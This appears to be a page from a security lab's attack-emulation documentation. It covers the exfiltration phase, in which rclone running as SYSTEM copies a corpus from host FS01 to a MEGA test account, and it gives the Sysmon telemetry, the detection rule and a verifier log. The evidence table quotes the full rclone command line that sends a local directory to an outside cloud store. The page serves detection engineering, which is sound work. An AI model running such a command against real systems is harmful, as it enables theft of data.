# Exfiltration

| | |
|---|---|
| Chain phase | Exfiltration |
| Account | SYSTEM |
| What happens | rclone copies the corpus to MEGA from FS01 |
| Telemetry | Sysmon 1 (rclone command line) |
| Detection | R11 |
| Payload / tooling | rclone (tools/rclone) |

## How the lab reproduces it

See [`attack-playbook/README.md`](../../../attack-playbook/README.md) for the ordered steps, the exact
commands and the checks after each step. Anything this phase writes is listed in
[`attack-playbook/payloads`](../../../attack-playbook/payloads/README.md).

## Evidence


Run 6, 2026-11-21, FS01, executed by `fs01-task.ps1` from the beacon session.

| UTC | Event | Locator | Excerpt |
|---|---|---|---|
| 12:05:58.766 | E1 | `AaH9_-2TxY-KOnHLj1eE` | `"C:\ProgramData\rclone.exe" --config C:\ProgramData\rclone.conf copy C:\C0015\corpus Mega:DATA -q --ignore-existing --auto-confirm`, parent `powershell.exe` |

The task's own verifier records the outcome in `fs01_task.log`:

```json
{"ts":"2026-11-21T12:06:00Z","step":"3","name":"exfil","status":"pass","observed":"exit=0; errors=0"}
```

`exit=0; errors=0` proves the command completed; it does not prove what the remote holds. No receiver
inventory is captured, and the lab's MEGA target is a test account.
